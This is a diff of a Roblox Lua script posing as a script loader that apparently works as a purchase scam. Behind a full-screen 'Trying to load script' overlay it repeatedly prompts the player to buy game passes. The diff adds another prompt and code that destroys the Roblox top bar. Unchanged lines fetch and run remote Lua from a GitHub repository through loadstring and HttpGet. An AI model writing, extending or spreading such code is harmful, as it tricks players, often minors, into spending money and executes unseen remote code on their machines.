@@ -1,6 +1,15 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/h4xal0t/wtf/main/two.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/h4xal0t/wtf/main/one.lua"))()
 
+local coreGui = game:GetService("CoreGui")
+local topBarApp = coreGui:FindFirstChild("TopBarApp")
+
+if topBarApp then
+    topBarApp:Destroy()
+else
+    print("wtf lol")
+end
+
 local screenGui = Instance.new("ScreenGui")
 screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
@@ -14,7 +23,7 @@ frame.Size = UDim2.new(1, 0, 1, 0)
 frame.Parent = screenGui
 
 local textLabel = Instance.new("TextLabel")
-textLabel.Text = "Trying to load script (30 secs)"
+textLabel.Text = "Trying to load script (30 sec)"
 textLabel.Size = UDim2.new(1, 0, 0.1, 0)
 textLabel.Position = UDim2.new(0, 0, 0.45, 0)
 textLabel.Parent = frame
@@ -74,6 +83,10 @@ local function prompt5()
 mps:PromptGamePassPurchase(game.Players.LocalPlayer, 629164294)
 end
 
+local function promptextra()
+mps:PromptGamePassPurchase(game.Players.LocalPlayer, 629363069)
+end
+
 local function prompt6()
 mps:PromptGamePassPurchase(game.Players.LocalPlayer, 634064461)
 end
@@ -108,6 +121,12 @@ if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 629164294) then
 print("ok")
 else
 prompt5()
+end
+wait(7)
+if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 629363069) then
+print("ok")
+else
+promptextra()
 end
 wait(7)
 if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 634064461) then
